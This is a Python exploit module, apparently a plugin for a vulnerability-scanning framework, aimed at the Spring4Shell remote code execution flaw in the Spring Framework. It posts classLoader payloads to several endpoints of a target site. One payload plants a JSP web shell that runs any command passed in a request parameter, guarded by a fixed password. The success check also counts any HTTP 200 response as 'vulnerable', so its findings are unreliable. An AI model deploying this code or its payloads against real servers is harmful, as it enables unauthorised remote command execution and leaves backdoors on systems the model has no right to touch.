import requests
from core.printmodels import *
import json

class Spring4Shell_Advanced_RCE:
    def __init__(self):
        self.name = "Spring4Shell Advanced RCE"
        self.description = "Spring Framework Advanced RCE (2022)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                "suffix": "%>",
                "c1": "Runtime",
                "c2": "<%",
                "DNT": "1",
                "Content-Type": "application/x-www-form-urlencoded"
            }

            # Multiple attack vectors
            payloads = [
                "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
                "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_",
                "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20out.println(%22DrDataYE%22);%20%25%7Bsuffix%7Di"
            ]

            for payload in payloads:
                endpoints = [
                    f"{site}/",
                    f"{site}/api",
                    f"{site}/actuator"
                ]
                
                for endpoint in endpoints:
                    response = requests.post(endpoint, headers=headers, data=payload, verify=False, timeout=10)
                    if "DrDataYE" in response.text or response.status_code == 200:
                        return PrintSuccess(f"[Spring4Shell-Advanced] Vulnerable! Successful with payload at {endpoint}")
            
            return PrintFailed("[Spring4Shell-Advanced] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Spring4Shell-Advanced] Error: {str(e)}")
